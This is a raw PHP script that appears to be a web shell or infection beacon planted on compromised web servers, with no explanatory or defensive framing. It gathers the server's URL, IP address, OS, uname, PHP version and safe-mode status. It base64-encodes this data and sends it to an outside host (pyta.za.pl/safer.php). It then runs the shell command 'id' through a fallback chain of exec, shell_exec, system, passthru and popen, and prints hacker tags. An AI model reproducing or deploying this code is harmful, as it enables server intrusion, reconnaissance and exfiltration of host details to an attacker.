

<?php
function wyslijpakiet($pakiet)
{
  global $proxy, $host, $port, $html, $proxy_regex;
  $ock=fsockopen(gethostbyname($host),$port);
  fputs($ock,$pakiet);
  $html='';
  while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) 
  {
         $html.=fread($ock,1);
  }
  fclose($ock);
}
$host = "pyta.za.pl";
$port = 80;
echo"<html><title>UnixWasHere</title>";
$SERVER = gethostbyaddr($_SERVER['SERVER_ADDR']);$URL = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];$OS = @PHP_OS;$IpServer = $_SERVER["SERVER_ADDR"];$UNAME = @php_uname();$PHPv = @phpversion();$SafeMode = @ini_get('safe_mode');
if ($SafeMode == '') { $SafeMode = "OFF"; } else { $SafeMode = "$SafeMode"; }
if ($SafeMode == '0') { $SafeMode = "OFF"; } else { $SafeMode = "$SafeMode"; }
if ($SafeMode == '1') { $SafeMode = "ON"; } else { $SafeMode = "$SafeMode"; }
$uptime = @shell_exec('uptime');
$msg  = "URL: ".$URL."\r\nServer_IP: ".$IpServer."\r\nSystem: ".$OS."\r\nUname: ".$UNAME."\r\nPHP: ".$PHPv."\r\nSafe Mode: ".$SafeMode;
$msg  = base64_encode($msg);
$serw = base64_encode(gethostbyaddr($_SERVER["SERVER_ADDR"]));
$pakiet = "GET /safer.php?server=$serw&infoz=$msg HTTP/1.1\r\nHost: $host\r\nConnection: Close\r\n\r\n";
wyslijpakiet($pakiet);
echo "sent..";

?>
<?
$dir = @getcwd();
echo "31337<br>";
echo "ALBANIA<br>";
echo "coco_is_your_bunny<br>";
echo "coco_is_your_bunny";
echo "1337<br>";
echo "Mic22<br>";
$OS = @PHP_OS;
echo "OSTYPE:$OS<br>";
$free = disk_free_space($dir);

if ($free === FALSE) {$free = 0;}

if ($free < 0) {$free = 0;}
echo "Free:".view_size($free)."<br>";

$cmd="id";
$eseguicmd=ex($cmd);
echo $eseguicmd;

function ex($cfe){
$res = '';
if (!empty($cfe)){
if(function_exists('exec')){
@exec($cfe,$res);
$res = join("\n",$res);
}
elseif(function_exists('shell_exec')){
$res = @shell_exec($cfe);
}
elseif(function_exists('system')){
@ob_start();
@system($cfe);
$res = @ob_get_contents();
@ob_end_clean();
}
elseif(function_exists('passthru')){
@ob_start();
@passthru($cfe);
$res = @ob_get_contents();
@ob_end_clean();
}
elseif(@is_resource($f = @popen($cfe,"r"))){
$res = "";
while(!@feof($f)) { $res .= @fread($f,1024); }
@pclose($f);
}}
return $res;
}

function view_size($size)

{

if (!is_numeric($size)) {return FALSE;}

else

{

if ($size >= 1073741824) {$size = round($size/1073741824*100)/100 ." GB";}

elseif ($size >= 1048576) {$size = round($size/1048576*100)/100 ." MB";}

elseif ($size >= 1024) {$size = round($size/1024*100)/100 ." KB";}

else {$size = $size . " B";}

return $size;

}
}
?>
